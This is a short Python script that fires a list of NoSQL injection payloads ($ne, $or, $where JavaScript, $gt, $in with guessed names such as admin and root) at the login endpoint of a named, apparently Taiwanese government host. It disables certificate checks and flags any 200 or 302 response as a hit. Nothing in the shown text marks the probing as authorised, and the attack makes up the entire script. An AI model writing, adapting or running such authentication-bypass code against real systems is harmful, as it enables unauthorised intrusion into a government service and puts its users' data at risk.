import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== NoSQL 深度: 组合操作符找 source 合法用户 ===")
tests={
  "$or username+password": {"username":{"$or":[{"$ne":None}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$and": {"username":{"$and":[{"$ne":None}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$where js": {"username":{"$where":"this!='nomatch'"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$gt 0": {"username":{"$gt":""},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$lt z": {"username":{"$lt":"z"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "username $ne + password str": {"username":{"$ne":None},"password":"x","captcha":"1","domain":"AUTH_SERVER"},
  "username str + password $ne": {"username":"admin","password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$elemMatch": {"username":{"$elemMatch":{"$ne":None}},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "double $ne": {"username":{"$ne":{"$ne":None}},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$in 多值": {"username":{"$in":["admin","root","tpf","operator"]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
}
for tag,body in tests.items():
    code,b=login(body,tag)
    mark=" ***" if code in (200,302) else ""
    print(f"  {tag:32s} -> {code} | {b[:75]}{mark}")
    time.sleep(0.1)
print("DONE")
